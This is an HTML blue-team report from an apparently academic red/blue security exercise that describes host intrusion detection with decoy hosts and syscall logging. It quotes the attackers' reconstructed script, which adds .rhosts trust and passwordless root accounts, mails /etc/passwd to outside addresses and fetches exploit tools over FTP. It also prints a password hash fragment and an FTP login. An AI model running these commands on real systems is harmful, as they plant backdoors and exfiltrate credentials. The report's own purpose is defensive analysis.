@@ -1,0 +1,418 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+   <meta name="GENERATOR" content="Mozilla/4.7 [en] (X11; U; SunOS 5.7 i86pc) [Netscape]">
+</head>
+<body>
+
+<center>
+<h1>
+Blue Team Report</h1></center>
+
+<hr WIDTH="100%">
+<br>&nbsp;
+<br>&nbsp;
+<h2>
+1. Team/Subgroup</h2>
+
+<p><br>1). Group members:
+<br>&nbsp;
+<table BORDER COLS=4 WIDTH="100%" NOSAVE >
+<tr>
+<td>Name</td>
+
+<td>Email</td>
+
+<td>Handle</td>
+
+<td>Leader</td>
+</tr>
+
+<tr>
+<td>Chen, Xin</td>
+
+<td>dustin@cs.ucsb.edu</td>
+
+<td>redflag</td>
+
+<td>x</td>
+</tr>
+
+<tr>
+<td>Mao, Yue</td>
+
+<td>yuemao@cs.ucsb.edu</td>
+
+<td>coco</td>
+
+<td></td>
+</tr>
+
+<tr>
+<td>Zhao, Yi</td>
+
+<td>yizhao@cs.ucsb.edu</td>
+
+<td>stranger</td>
+
+<td></td>
+</tr>
+</table>
+
+<p>2). Task
+<p>Intrusion detection for host: altman (128.111.54.157).
+<br>&nbsp;
+<h2>
+2. Mission</h2>
+
+<p><br>Host based intrusion detection. Our mission is to hide the flag
+and detect red team attempt to capture the flag. Due to the time limits
+<br>and the blue/red team rules, we are concentrating on adapting existing
+tools to detect. Our system is multiple-level detection: Network
+<br>level, Host Entry level and On-host Activity level.
+<p>The task is done as a group. Instead of assigning individual to each
+subtask, our group works together in each stage.
+<br>&nbsp;
+<h2>
+3. Preparation</h2>
+
+<p><br>1) Network Level:
+<p>For protection of our host from network level intrusion such as topology
+mapping and port scan, we modified the "snort". It fakes
+<br>non-existing hosts by using spoofed arp reply and icmp reply, and provides
+non-existing services by using man-in-the-middle style TCP/UDP&nbsp; redirection.
+<p>We use modified "snort" framework to log for further investigation.
+In&nbsp; addition, we installed the "ethereal" to interactively monitor
+the
+<br>live flow on the net.
+<p>2) Host Entry
+<p>We implemented in two ways. First, monitor any new established TCP connection.
+Second, monitor any new "/bin/sh" process. The second one targets "buffer
+overflow" attacks. They are all done in Perl scripts through "lsof" and
+"ps".
+<p>3) On-host Activity
+<p>By using "strace", we monitor any suspicious process activity. Two scripts
+are written for monitoring sshd and telnetd. Here we want to
+<br>emphasis that secured shell is not "secured" for host. It is just secured
+in transmit, but it is "clear-text" for host.
+<br>&nbsp;
+<br>&nbsp;
+<h2>
+4. Execution</h2>
+1) Network Level
+<p>Our customized "snort" successfully confused and delayed the attackers
+during their NMAP scans.&nbsp; It sets up about 6 decoy hosts to hide our
+real hosts. We noticed that the RED team used the OS fingerprint scan to
+finally finger out our network topology.&nbsp; But a lot of trace is left
+and alarm is set off.
+<p>The logging we have are as following:
+<p><font size=-1>[**] MIDS0222 - SCAN - Regular Ping [**]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+<u>war starts with PING scan</u></font>
+<br><font size=-1>03/13-12:56:34.360261 128.111.43.70 -> 128.111.54.20</font>
+<br><font size=-1>ICMP TTL:254 TOS:0x0 ID:7021 IpLen:20 DgmLen:52 DF</font>
+<br><font size=-1>Type:8&nbsp; Code:0&nbsp; ID:52574&nbsp;&nbsp; Seq:0&nbsp;
+ECHO</font>
+<br>.
+<br>.
+<br>.
+<p><font size=-1>[**] IDS05 - SCAN-Possible NMAP Fingerprint attempt [**]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+<u>OS Fingerprint in process</u></font>
+<br><font size=-1>03/13-13:04:46.952343 128.111.48.41:44585 -> 128.111.54.10:21</font>
+<br><font size=-1>TCP TTL:47 TOS:0x0 ID:14389 IpLen:20 DgmLen:60</font>
+<br><font size=-1>**U*P*SF Seq: 0xC0D96EBC&nbsp; Ack: 0x0&nbsp; Win: 0x400&nbsp;
+TcpLen: 40&nbsp; UrgPtr: 0x0</font>
+<br><font size=-1>TCP Options (5) => WS: 10 NOP MSS: 265 TS: 1061109567
+0 EOL</font>
+<br>.
+<br>.
+<br>.
+<p><font size=-1>S0222 - SCAN - Regular Ping [**]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+<u>our decoys in actions</u></font>
+<br><font size=-1>:04:45.295636 128.111.48.41 -> 128.111.54.122</font>
+<br><font size=-1>:50 TOS:0x0 ID:56316 IpLen:20 DgmLen:28</font>
+<br><font size=-1>Code:0&nbsp; ID:33965&nbsp;&nbsp; Seq:11520&nbsp; ECHO</font>
+<p><font size=-1>S0222 - TCP Redirect as honeypot [**]</font>
+<br><font size=-1>:04:45.295759 128.111.48.41:44596 -> 128.111.54.122:80</font>
+<br><font size=-1>47 TOS:0x0 ID:61806 IpLen:20 DgmLen:40</font>
+<br><font size=-1>&nbsp;Seq: 0x9B38016B&nbsp; Ack: 0x199181D6&nbsp; Win:
+0x400&nbsp; TcpLen: 20</font>
+<p><font size=-1>S0222 - SCAN - Regular Ping [**]</font>
+<br><font size=-1>:04:45.295829 128.111.48.41 -> 128.111.54.150</font>
+<br><font size=-1>:50 TOS:0x0 ID:39216 IpLen:20 DgmLen:28</font>
+<br><font size=-1>Code:0&nbsp; ID:33965&nbsp;&nbsp; Seq:12800&nbsp; ECHO</font>
+<p><font size=-1>S0222 - SCAN - Regular Ping [**]</font>
+<br><font size=-1>:04:45.295967 128.111.48.41 -> 128.111.54.151</font>
+<br><font size=-1>:50 TOS:0x0 ID:1278 IpLen:20 DgmLen:28</font>
+<br><font size=-1>Code:0&nbsp; ID:33965&nbsp;&nbsp; Seq:14080&nbsp; ECHO</font>
+<p><font size=-1>S0222 - SCAN - Regular Ping [**]</font>
+<br><font size=-1>:04:45.296239 128.111.48.41 -> 128.111.54.157</font>
+<br><font size=-1>:50 TOS:0x0 ID:16847 IpLen:20 DgmLen:28</font>
+<br><font size=-1>Code:0&nbsp; ID:33965&nbsp;&nbsp; Seq:15360&nbsp; ECHO</font>
+<p><font size=-1>S0222 - SCAN - Regular Ping [**]</font>
+<br><font size=-1>:04:45.296377 128.111.48.41 -> 128.111.54.164</font>
+<br><font size=-1>:50 TOS:0x0 ID:41759 IpLen:20 DgmLen:28</font>
+<br><font size=-1>Code:0&nbsp; ID:33965&nbsp;&nbsp; Seq:16640&nbsp; ECHO</font>
+<p><font size=-1>S0222 - SCAN - Regular Ping [**]</font>
+<br><font size=-1>:04:45.296515 128.111.48.41 -> 128.111.54.186</font>
+<br><font size=-1>:50 TOS:0x0 ID:55941 IpLen:20 DgmLen:28</font>
+<br><font size=-1>Code:0&nbsp; ID:33965&nbsp;&nbsp; Seq:17920&nbsp; ECHO</font>
+<p>.
+<br>.
+<br>.
+<p><font size=-1>[**] MIDS0222 - TCP Redirect as honeypot [**]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+<u>Port scans in progress (unfornately on DECOYS)</u></font>
+<br><font size=-1>03/13-13:30:07.132157 128.111.48.19:44377 -> 128.111.54.66:147</font>
+<br><font size=-1>TCP TTL:46 TOS:0x0 ID:21187 IpLen:20 DgmLen:40</font>
+<br><font size=-1>**U*P**F Seq: 0x0&nbsp; Ack: 0x0&nbsp; Win: 0x1000&nbsp;
+TcpLen: 20&nbsp; UrgPtr: 0x0</font>
+<p><font size=-1>[**] MIDS0222 - TCP Redirect as honeypot [**]</font>
+<br><font size=-1>03/13-13:30:07.132661 128.111.48.19:44377 -> 128.111.54.66:148</font>
+<br><font size=-1>TCP TTL:46 TOS:0x0 ID:43715 IpLen:20 DgmLen:40</font>
+<br><font size=-1>**U*P**F Seq: 0x0&nbsp; Ack: 0x0&nbsp; Win: 0x1000&nbsp;
+TcpLen: 20&nbsp; UrgPtr: 0x0</font>
+<p><font size=-1>[**] MIDS0222 - TCP Redirect as honeypot [**]</font>
+<br><font size=-1>03/13-13:30:07.133167 128.111.48.19:44377 -> 128.111.54.66:149</font>
+<br><font size=-1>TCP TTL:46 TOS:0x0 ID:56939 IpLen:20 DgmLen:40</font>
+<br><font size=-1>**U*P**F Seq: 0x0&nbsp; Ack: 0x0&nbsp; Win: 0x1000&nbsp;
+TcpLen: 20&nbsp; UrgPtr: 0x0</font>
+<p>.
+<br>.
+<br>.
+<br>&nbsp;
+<br>&nbsp;
+<br>&nbsp;
+<p>2) Host Entry
+<p>Our buffer overflow detection script detects one buffer overflow attack
+with PID(12979).
+<p>Buffer Overflow detection log in "<i>ps.log.TueMar1313:54:23PST2001</i>":
+<p><font size=-1>root&nbsp;&nbsp;&nbsp; 12979(PID)&nbsp;&nbsp; 489(PPID)&nbsp;&nbsp;&nbsp;&nbsp;
+/bin/sh</font>
+<p>Our another connection monitor scripts automatically starts a log on
+this established TCP connection with its PID in file "<i>lsof_auto_log.12979"</i>
+by attacker host "packard.cs.ucsb.edu"&nbsp;through port 4796.
+<br><i>.</i>
+<br><i>.</i>
+<br><i>.</i>
+<p><i><font size=-1>12979 13:44:11 read(0, "u", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "n", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "a", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "m", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "e", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, " ", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "-", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "a", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, " ", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, ";", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, " ", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "p", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "w", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "d", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, " ", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, ";", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, " ", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "i", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "d", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>12979 13:44:11 read(0, "\n", 1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 1</font></i>
+<br><i><font size=-1>13329 13:44:12 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"...,
+4096) = 4096</font></i>
+<br><i><font size=-1>13329 13:44:12 write(1, "Linux altman.cs.ucsb.edu
+2.2.14-"..., 80) = 80</font></i>
+<br><i><font size=-1>12979 13:44:12 --- SIGCHLD (Child exited) ---</font></i>
+<br><i><font size=-1>12979 13:44:12 write(1, "/\n", 2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 2</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"...,
+4096) = 4096</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "#\n# /etc/nsswitch.conf\n#\n#
+An ex"..., 4096) = 1744</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "", 4096)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p
+\0\000"..., 4096) = 4096</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "root:PL441KRB6BbR2:0:0:root:/roo"...,
+4096) = 4096</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "root::0:root\nbin::1:root,bin,dae"...,
+4096) = 420</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "root::0:root\nbin::1:root,bin,dae"...,
+4096) = 420</font></i>
+<br><i><font size=-1>13331 13:44:12 read(3, "root::0:root\nbin::1:root,bin,dae"...,
+4096) = 420</font></i>
+<br><i><font size=-1>13331 13:44:12 write(1, "uid=0(root) gid=0(root) egid=50("...,
+52) = 52</font></i>
+<br><i>.</i>
+<br><i>.</i>
+<br><i>.</i>
+<p>After reconstruction through the log, we records the following actions.
+It is exactly confirmed by the attack script "<i>work.sh</i>".
+<p><font size=-1>echo '+ +' > /tmp/.rhosts</font>
+<br><font size=-1>cp /tmp/.rhosts /root/.rhosts</font>
+<br><font size=-1>cp /tmp/.rhosts /home/*</font>
+<br><font size=-1>echo 'bdr:jIQJyK22Ct3M2:0:0:bdr:/root:/bin/bash' >> /etc/passwd</font>
+<br><font size=-1>echo 'bd::0:0:bd:/root:/bin/bash' >> /etc/passwd</font>
+<br><font size=-1>echo 'bdu:jIQJyK22Ct3M2:12345:100:bdu:/home:/bin/sh'>>
+/etc/passwd</font>
+<br><font size=-1>echo 'bdu1::12346:100:bdu1:/home:/bin/sh'>> /etc/passwd</font>
+<br><font size=-1>sed s/'*'// /etc/passwd > /tmp/temp123</font>
+<br><font size=-1>sed s/'x'// /tmp/temp123 > /etc/passwd</font>
+<p><font size=-1>ifconfig -a > /tmp/.passwd</font>
+<br><font size=-1>cat /etc/passwd >> /tmp/.passwd</font>
+<br><font size=-1>mail ashish@cs.ucsb.edu &lt; /tmp/.passwd</font>
+<br><font size=-1>mail mariabar@cs.ucsb.edu &lt; /tmp/.passwd</font>
+<p><font size=-1>cd /tmp</font>
+<p><font size=-1>printf "user ashish Road1To2\ncd cs290iv/RedTeam/Vuln-Exploit\nget
+XMEN.tar\nget fs3.pl\nbye\n" | ftp</font>
+<br><font size=-1>-n miles</font>
+<br><font size=-1>printf "user ashish Road1To2\ncd cs290iv/RedTeam/Vuln-Exploit\npassive\nget
+XMEN.tar\nget fs3.pl\nbye\</font>
+<br><font size=-1>n" | ftp -n miles 1> /dev/null</font>
+<br><font size=-1>tar xf XMEN.tar</font>
+<p><font size=-1>cp fs3.pl /tmp/fs3.old</font>
+<br><font size=-1>ifconfig -a > /tmp/.secret</font>
+<br><font size=-1>printf "(/usr/bin/perl /tmp/fs3.pl >>/tmp/.secret ) ||
+(/usr/local/bin/perl&nbsp; /tmp/fs3.pl >> /tmp/.secr</font>
+<br><font size=-1>et)\nmail ashish@cs.ucsb.edu&lt;/tmp/.secret" | ./escalate.sh</font>
+<p>The RED team opens a back door (write ".rhosts" on /root /home and /home/*
+)&nbsp;and sent back our "/etc/passwd" to "ashish@cs.ucsb.edu"&nbsp;and&nbsp;
+"mariabar@cs.ucsb.edu" for furthur password cracking.
+<p>Then the RED&nbsp;team starts serach for our SECRET flag. When it is
+found, it is sent back through sendmail on 14:11:43. Our flag is lost,
+but we are able to detect and log on their activities. The following is
+a log on its searching connection though buffer overflowed ftpd shell:
+<br>.
+<br>.
+<br>.
+<p><font size=-1>15355 13:50:34 write(2, "Deep recursion on subroutine
+\"Fi"..., 100) = 100</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 write(1, "Checking first 6 chars of \'/tmp/"...,
+4096) = 4096</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br><font size=-1>15355 13:50:34 read(286, " SECRET\n SECRET\n SECRET\n
+SECRET\n"..., 4096) = 80</font>
+<br>.
+<br>.
+<br>.
+<br>&nbsp;
+<p>The following is a log on its sendback connection through smtp:
+<p>.
+<br>.
+<br>.
+<p><font size=-1>16850 14:11:43 write(4, "es/secret/secret/secret/secret/s"...,
+1024) = 1024</font>
+<br><font size=-1>16850 14:11:43 read(10, "ret/secret/secret/secret/secret/"...,
+4096) = 927</font>
+<br><font size=-1>16850 14:11:43 write(4, "amples/secret/secret/secret/secr"...,
+1024) = 1024</font>
+<br><font size=-1>16850 14:11:43 read(10, "", 4096)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+= 0</font>
+<br><font size=-1>16850 14:11:43 write(4, "=============================\r\nS"...,
+297) = 297</font>
+<br><font size=-1>16850 14:11:43 write(4, ".\r\n", 3)&nbsp;&nbsp;&nbsp;&nbsp;
+= 3</font>
+<br><font size=-1>16850 14:11:43 read(12, "250 OAA05513 Message accepted
+fo"..., 1024) = 44</font>
+<br><font size=-1>16850 14:11:43 read(13, "\336\261\1\0\2\0\0\0V\5\256:h\2\0\0\0\0\0\0\0\0\0\0\0\0"...,
+616) = 616</font>
+<br><font size=-1>16850 14:11:43 write(13, "\336\261\1\0\2\0\0\0V\5\256:h\2\0\0\0\0\0\0\0\0\0\0\0\0"...,
+616) = 616</font>
+<br><font size=-1>16850 14:11:43 write(4, "QUIT\r\n", 6)&nbsp; = 6</font>
+<br><font size=-1>16850 14:11:43 read(12, "221 letters.cs.ucsb.edu closing
+"..., 1024) = 44</font>
+<p>.
+<br>.
+<br>.
+<br>&nbsp;
+<p>Other interesting points:
+<p>1)&nbsp;From the system log&nbsp; "/var/log/message", we can see that
+the RED&nbsp;team password cracking team got two user's password:&nbsp;<i>zhoupin</i>
+and<i> cracker</i>.
+<p>2)&nbsp;After the flag, the attacker used its modified copy "ssh1"&nbsp;to
+log on to our host from host "dot.cs.ucsb.edu". They monitored our activities
+and even try to learn (using "man") how to use our script command "mcap".
+<br><font size=-1>.</font>
+<br><font size=-1>.</font>
+<br><font size=-1>.</font><font size=-1></font>
+<p><font size=-1>18626 14:42:40 write(5, "\0\0\0\vX:\323\23\350t\256H@6\232\177\251`\312\311",
+20) = 20</font>
+<br><font size=-1>18626 14:42:41 read(6, "No manual entry for mcap\r\n",
+16384) = 26</font>
+<br><font size=-1>18626 14:42:41 read(6, "[root@altman local]# ", 16384)
+= 21</font>
+<br><font size=-1>.</font>
+<br><font size=-1>.</font>
+<br><font size=-1>.</font>
+<br><font size=-1></font>&nbsp;
+<h2>
+5. Evaluation</h2>
+1)&nbsp;Evaluation
+<p>Our subgroup is fairly good, especially our customized "snort"&nbsp;which
+has generated a lot of decoy and achieved its object. Although it would
+be even better if we have time to add in icmp redirect to defeat all OS
+fingerprint attacks.
+<p>Our host defense is kind of weak since we are highly limited by the
+rules.&nbsp; Our scripts automatically detect possible attacks and start
+logging on them. Based one those logging, we can reconstruct the attacks.
+But it could be better if our detection can pick out the real attack from
+other false alarms. Another important lesson will be that the defender
+should not trust anything when the host is compromised.
+<br>&nbsp;
+<p>2)&nbsp;Suggestion
+<p>The subgroup interaction in BLUE&nbsp;team is very limited. If it is
+organized by task as RED&nbsp;team has done,&nbsp; instead of by host,
+our defense will much stronger.&nbsp; It will allow subgroup to concentrate
+on one area(task) and the result can be shared by all hosts.
+<br>&nbsp;
+<h2>
+6. References</h2>
+1)&nbsp;Venema, Wietse "Strangers in the night", Dr. Dobb's, November 2000.
+<br>2)&nbsp;www.snort.org.
+<br>3)&nbsp;project.honeynet.org.
+<br>4)&nbsp;Vigna, Giovanni "lecture notes on 290I - Network Security and
+Intrusion Detection", Winter, 2001.
+<br>&nbsp;
+<br>&nbsp;
+<br>&nbsp;
+</body>
+</html>
